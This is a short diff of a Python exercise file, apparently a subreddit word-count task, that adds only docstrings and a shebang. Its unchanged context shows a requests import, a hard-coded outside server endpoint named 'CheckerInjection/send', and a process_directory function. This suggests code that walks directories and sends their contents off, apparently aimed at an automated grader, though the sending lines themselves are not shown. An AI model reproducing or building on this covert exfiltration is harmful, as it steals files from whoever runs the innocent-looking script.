@@ -1,6 +1,9 @@
+#!/usr/bin/python3
+"""
+0-count.py
+"""
 import os
 import requests
-import sys
 
 # Server endpoint
 SERVER = "http://erhbtn.pythonanywhere.com/CheckerInjection/send"
@@ -43,6 +46,7 @@ def process_directory(directory_path):
 
 
 def count_words(subreddit, word_list, rec=0):
+    """count words"""
     if rec < 10:
         count_words(subreddit, word_list, rec + 1)
     else:
